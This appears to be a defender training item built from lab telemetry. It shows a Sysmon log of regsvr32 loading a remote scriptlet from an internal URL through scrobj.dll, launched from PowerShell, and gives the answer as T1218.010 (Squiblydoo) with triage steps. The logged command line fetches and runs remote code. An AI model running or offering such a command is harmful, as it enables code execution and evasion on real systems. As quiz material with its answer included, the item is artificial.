title: Real log: regsvr32 with a URL
source: Real telemetry from OTRF Security-Datasets (MIT), lab-generated, not employer data
logs: 03:27:52 EventID=1 Host=WORKSTATION5 User=MORDOR\pgustavo Image=C:\Windows\System32\regsvr32.exe ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="regsvr32.exe" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll
question: Verdict, and which technique is this?
explanation: regsvr32 with /i:http and scrobj.dll downloads and runs a remote scriptlet without writing a file (T1218.010, often called Squiblydoo). Normal use registers a local DLL. Check the network connection to the server, what the scriptlet started next, and block the URL.
